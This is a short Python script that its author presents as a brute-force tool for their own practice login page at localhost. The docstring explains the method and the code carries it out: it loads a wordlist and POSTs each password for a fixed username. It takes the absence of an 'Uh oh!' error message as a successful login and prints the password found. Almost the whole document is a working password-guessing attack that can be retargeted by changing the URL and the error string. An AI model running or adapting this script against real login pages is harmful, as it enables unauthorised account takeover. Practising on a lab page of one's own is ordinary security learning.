"""

	This is a programme intended to bruteforce a login page But I designed it for my login Page at
	https://github.com/ninjahacker123/Login-page. It takes a wordlist and iterated through every word
	sending a post request to the site. When it soesent recieve the try again paige it would mean that
	we have successfull logged in and it prints thhe password!

	written in Python Python 3.7.6

	-Joseph Marc Antony

"""

import requests

url = "http://localhost:3000"
file = "wordlist.txt"
wordlist = open(file, "r").readlines()

for word in wordlist:
	password = word.strip()
	payload = data={"username": "test@gmail.com", "password": password}

	if "Uh oh!" in str(requests.post(url, data={"username": "test@gmail.com", "password": password}).content):
		print(f"[-] Incorrect Password: {password}")
	else:
		print(f"[+] Password Found: {word}")
		break
